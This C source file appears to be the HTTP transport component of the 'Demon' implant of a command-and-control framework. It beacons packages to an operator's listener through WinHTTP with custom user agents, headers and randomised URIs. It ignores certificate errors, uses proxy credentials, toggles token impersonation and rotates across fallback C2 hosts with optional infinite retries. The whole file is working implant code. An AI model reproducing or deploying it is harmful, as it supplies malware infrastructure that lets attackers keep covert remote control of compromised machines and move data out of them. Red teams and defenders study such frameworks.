#include <Demon.h>

#include <Core/TransportHttp.h>
#include <Core/MiniStd.h>

#ifdef TRANSPORT_HTTP

BOOL HttpSend( PBUFFER Send, PBUFFER Response )
{
    HANDLE  hConnect        = NULL;
    HANDLE  hSession        = NULL;
    HANDLE  hRequest        = NULL;

    LPWSTR  HttpHeader      = NULL;
    LPWSTR  HttpEndpoint    = NULL;
    DWORD   HttpFlags       = 0;
    DWORD   HttpAccessType  = 0;
    LPCWSTR HttpProxy       = NULL;

    DWORD   Counter         = 0;
    DWORD   Iterator        = 0;
    DWORD   BufRead         = 0;
    UCHAR   Buffer[ 1024 ]  = { 0 };
    PVOID   RespBuffer      = NULL;
    SIZE_T  RespSize        = 0;
    BOOL    Successful      = TRUE;

    /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
    TokenImpersonate( FALSE );

    /* if we don't have any more hosts left, then exit */
    if ( ! Instance.Config.Transport.Host )
    {
        PUTS( "No hosts left to use... exit now." )
        CommandExit( NULL );
    }

    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        HttpAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        HttpProxy      = Instance.Config.Transport.Proxy.Url;
    }

    /* PRINTF( "WinHttpOpen( %ls, %x, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy ) */
    hSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( ! hSession )
    {
        PRINTF( "WinHttpOpen: Failed => %d\n", NtGetLastError() )

        Successful = FALSE;
        goto LEAVE;
    }

    /* PRINTF( "WinHttpConnect( %x, %ls, %d, 0 )\n", hSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port ) */
    hConnect = Instance.Win32.WinHttpConnect( hSession, Instance.Config.Transport.Host->Host, Instance.Config.Transport.Host->Port, 0 );
    if ( ! hConnect )
    {
        PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
        Successful = FALSE;
        goto LEAVE;
    }

    Counter = 0;
    while ( TRUE )
    {
        if ( ! Instance.Config.Transport.Uris[ Counter ] ) break;
        else Counter++;
    }

    HttpEndpoint = Instance.Config.Transport.Uris[ RandomNumber32() % Counter ];
    HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Instance.Config.Transport.Secure )
        HttpFlags |= WINHTTP_FLAG_SECURE;

    /* PRINTF( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance.Config.Transport.Method, HttpEndpoint, HttpFlags ) */
    hRequest = Instance.Win32.WinHttpOpenRequest( hConnect, Instance.Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
    if ( ! hRequest )
    {
        PRINTF( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )

        Successful = FALSE;
        goto LEAVE;
    }

    if ( Instance.Config.Transport.Secure )
    {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
        {
            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }
    }

    /* Add our headers */
    do
    {
        HttpHeader = Instance.Config.Transport.Headers[ Iterator ];

        if ( ! HttpHeader )
            break;

        Instance.Win32.WinHttpAddRequestHeaders( hRequest, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );

        Iterator++;
    } while ( TRUE );

    if ( Instance.Config.Transport.Proxy.Enabled )
    {
        WINHTTP_PROXY_INFO ProxyInfo = { 0 };

        ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        ProxyInfo.lpszProxy    = Instance.Config.Transport.Proxy.Url;

        if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) )
        {
            PRINTF( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
        }

        if ( Instance.Config.Transport.Proxy.Username )
        {
            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_USERNAME, Instance.Config.Transport.Proxy.Username, StringLengthW( Instance.Config.Transport.Proxy.Username ) ) )
            {
                PRINTF( "Failed to set proxy username %u", NtGetLastError() );
            }
        }

        if ( Instance.Config.Transport.Proxy.Password )
        {
            if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY_PASSWORD, Instance.Config.Transport.Proxy.Password, StringLengthW( Instance.Config.Transport.Proxy.Password ) ) )
            {
                PRINTF( "Failed to set proxy password %u", NtGetLastError() );
            }
        }
    }

    /* Send package to our listener */
    if ( Instance.Win32.WinHttpSendRequest( hRequest, NULL, 0, Send->Buffer, Send->Length, Send->Length, NULL ) )
    {
        if ( Instance.Win32.WinHttpReceiveResponse( hRequest, NULL ) )
        {
            /* Is the server recognizing us ? are we good ?  */
            if ( HttpQueryStatus( hRequest) != HTTP_STATUS_OK )
            {
                PUTS( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )

                Successful = FALSE;
                goto LEAVE;
            }

            if ( Response )
            {
                RespBuffer = NULL;
                do
                {
                    Successful = Instance.Win32.WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
                    if ( ! Successful || BufRead == 0 )
                    {
                        break;
                    }

                    if ( ! RespBuffer )
                        RespBuffer = Instance.Win32.LocalAlloc( LPTR, BufRead );
                    else
                        RespBuffer = Instance.Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );

                    RespSize += BufRead;

                    MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
                    MemSet( Buffer, 0, 1024 );

                } while ( Successful == TRUE );

                Response->Length = RespSize;
                Response->Buffer = RespBuffer;

                Successful = TRUE;
            }
        }
    }
    else
    {
        if ( NtGetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
            Instance.Session.Connected = FALSE;

        PRINTF( "HTTP Error: %d\n", NtGetLastError() )

        Successful = FALSE;
        goto LEAVE;
    }

    LEAVE:
    if ( hSession )
        Instance.Win32.WinHttpCloseHandle( hSession );

    if ( hConnect )
        Instance.Win32.WinHttpCloseHandle( hConnect );

    if ( hRequest )
        Instance.Win32.WinHttpCloseHandle( hRequest );

    /* re-impersonate the token */
    TokenImpersonate( TRUE );

    if ( ! Successful )
    {
        /* if we hit our max then we use our next host */
        Instance.Config.Transport.Host = HostFailure( Instance.Config.Transport.Host );
    }

    return Successful;
}

/* Query status code from our server response */
DWORD HttpQueryStatus( HANDLE hRequest )
{
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( Instance.Win32.WinHttpQueryHeaders(
            hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX,
            &StatusCode, &StatusSize, WINHTTP_NO_HEADER_INDEX
    )
            )
    {
        return StatusCode;
    }

    return 0;
}

PHOST_DATA HostAdd( LPWSTR Host, SIZE_T Size, DWORD Port )
{
    PRINTF( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );

    PHOST_DATA HostData = NULL;

    HostData       = NtHeapAlloc( sizeof( HOST_DATA ) );
    HostData->Host = NtHeapAlloc( Size + sizeof( WCHAR ) );
    HostData->Port = Port;
    HostData->Dead = FALSE;
    HostData->Next = Instance.Config.Transport.Hosts;

    /* Copy host to our buffer */
    MemCopy( HostData->Host, Host, Size );

    /* Add to hosts linked list */
    Instance.Config.Transport.Hosts = HostData;

    return HostData;
}

PHOST_DATA HostFailure( PHOST_DATA Host )
{
    if ( ! Host )
        return NULL;

    if ( Host->Failures == Instance.Config.Transport.HostMaxRetries )
    {
        /* we reached our max failed retries with our current host data
         * use next one */
        Host->Dead = TRUE;

        /* Get our next host based on our rotation strategy. */
        return HostRotation( Instance.Config.Transport.HostRotation );
    }

    /* Increase our failed counter */
    Host->Failures++;

    PRINTF( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )

    return Host;
}

/* Gets a random host from linked list. */
PHOST_DATA HostRandom()
{
    PHOST_DATA Host  = NULL;
    DWORD      Index = RandomNumber32() % HostCount();
    DWORD      Count = 0;

    Host = Instance.Config.Transport.Hosts;

    for ( ;; )
    {
        if ( Count == Index )
            break;

        if ( ! Host )
            break;

        /* if we are the end and still didn't found the random index quit. */
        if ( ! Host->Next )
        {
            Host = NULL;
            break;
        }

        Count++;

        /* Next host please */
        Host = Host->Next;
    }

    PRINTF( "Index: %d\n", Index )
    PRINTF( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )

    return Host;
}

PHOST_DATA HostRotation( SHORT Strategy )
{
    PHOST_DATA Host = NULL;

    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
    {
        DWORD Count = 0;

        /* get linked list */
        Host = Instance.Config.Transport.Hosts;

        /* If our current host is empty
         * then return the top host from our linked list. */
        if ( ! Instance.Config.Transport.Host )
            return Host;

        for ( Count = 0; Count < HostCount();  )
        {
            /* check if it's not an emtpy pointer */
            if ( ! Host )
                break;

            /* if the host is dead (max retries limit reached) then continue */
            if ( Host->Dead )
                Host = Host->Next;
            else break;
        }
    }
    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
    {
        /* Get a random Host */
        Host = HostRandom();

        /* if we fail use the first host we get available. */
        if ( Host->Dead )
            /* fallback to Round Robin */
            Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
    }

    /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
     * as the operator wants. */
    if ( ( Instance.Config.Transport.HostMaxRetries == 0 ) && ! Host )
    {
        PUTS( "Specified to keep going. To infinity... and beyond" )

        /* get linked list */
        Host = Instance.Config.Transport.Hosts;

        /* iterate over linked list */
        for ( ;; )
        {
            if ( ! Host )
                break;

            /* reset failures */
            Host->Failures = 0;
            Host->Dead     = FALSE;

            Host = Host->Next;
        }

        /* tell the caller to start at the beginning */
        Host = Instance.Config.Transport.Hosts;
    }

    return Host;
}

DWORD HostCount()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;

    Head = Instance.Config.Transport.Hosts;
    Host = Head;

    do {

        if ( ! Host )
            break;

        Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;

    } while ( TRUE );

    return Count;
}

BOOL HostCheckup()
{
    PHOST_DATA Host  = NULL;
    PHOST_DATA Head  = NULL;
    DWORD      Count = 0;
    BOOL       Alive = TRUE;

    Head = Instance.Config.Transport.Hosts;
    Host = Head;

    do {
        if ( ! Host )
            break;

        if ( Host->Dead )
            Count++;

        Host = Host->Next;

        /* if we are at the beginning again then stop. */
        if ( Head == Host )
            break;
    } while ( TRUE );

    /* check if every host is dead */
    if ( HostCount() == Count )
        Alive = FALSE;

    return Alive;
}
#endif